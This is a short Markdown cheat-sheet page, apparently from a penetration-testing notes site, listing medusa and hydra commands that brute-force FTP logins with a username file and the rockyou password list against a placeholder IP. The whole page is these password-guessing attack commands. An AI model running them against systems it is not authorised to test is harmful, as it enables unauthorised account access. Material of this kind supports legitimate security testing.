---
title: FTP
parent: Others
layout: default
nav_order: 1
---

medusa:\
`medusa -h IP -U usernames.txt -P /usr/share/seclists/rockyou.txt -M ftp -t 3`

hydra:\
`hydra -L usernames.txt -P /usr/share/seclists/rockyou.txt -s port ftp://IP`